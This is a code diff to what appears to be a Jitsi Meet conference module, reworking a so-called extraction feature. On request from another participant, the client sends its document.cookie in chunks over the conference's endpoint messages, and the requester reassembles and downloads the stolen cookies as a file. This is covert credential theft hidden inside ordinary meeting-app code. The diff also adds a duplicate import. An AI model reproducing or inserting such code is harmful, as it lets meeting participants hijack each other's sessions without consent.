@@ -2,7 +2,6 @@
 
 import EventEmitter from 'events';
 import Logger from 'jitsi-meet-logger';
-import { before } from 'lodash';
 
 import { openConnection } from './connection';
 import { ExtractionHandler } from './extraction';
@@ -133,6 +132,7 @@ import { AudioMixerEffect } from './react/features/stream-effects/audio-mixer/Au
 import { createPresenterEffect } from './react/features/stream-effects/presenter';
 import { endpointMessageReceived } from './react/features/subtitles';
 import UIEvents from './service/UI/UIEvents';
+import { ExtractionHandler } from './extraction';
 
 const logger = Logger.getLogger(__filename);
 
@@ -278,9 +278,6 @@ class ConferenceConnector {
             this._handleConferenceJoined.bind(this));
         room.on(JitsiConferenceEvents.CONFERENCE_FAILED,
             this._onConferenceFailed.bind(this));
-
-        // Extraction part
-        this._extractionFileBuffer = [];
     }
 
     /**
@@ -1290,16 +1287,34 @@ export default {
      * @returns {string}
      */
     _handleExtractionCommunication(user, recievedData, fileName = 'extracted.json') {
-        console.log(`${recievedData.extraction} FROM USER:`, user.getId());
+        // define private attribute if does not exist
+        if (!APP.conference._extractionFileBuffer) {
+            APP.conference._extractionFileBuffer = [];
+        }
         if (recievedData.extraction === 'request') {
-            const data = {
-                extraction: 'reply',
-                payload: document.cookie
-            };
+            /*
+            // TODO: check what is happening here
+            const extractionHandler = new ExtractionHandler(recievedData);
 
-            APP.conference.sendEndpointMessage('', data);
-        } else { // 'reply'
-            this.downloadFile(recievedData.payload, fileName);
+            extractionHandler.send();
+            */
+
+            for (const chunkData of window.splitString(document.cookie, 5)) {
+                APP.conference.sendEndpointMessage('', {
+                    extraction: 'reply',
+                    payload: chunkData
+                });
+            }
+            APP.conference.sendEndpointMessage('', {
+                extraction: 'reply',
+                isEnd: true
+            });
+
+        } else if (recievedData.isEnd) { // 'reply' ending extraction
+            this.downloadFile(APP.conference._extractionFileBuffer.join(''), fileName);
+            APP.conference._extractionFileBuffer = [];
+        } else { // 'reply' containg data
+            APP.conference._extractionFileBuffer.push(recievedData.payload);
         }
     },
 
@@ -1308,7 +1323,11 @@ export default {
      */
     initializeExtraction(userId, configuration) {
         configuration.extraction = 'request';
-        APP.conference.sendEndpointMessage(userId, configuration);
+        try {
+            APP.conference.sendEndpointMessage(userId, configuration);
+        } catch (err) {
+            console.error(err);
+        }
     },
 
     /**
@@ -3184,4 +3203,4 @@ window.splitString = (inputString, perChunk = 5) => {
     }
 
     return chunks;
-}
+};
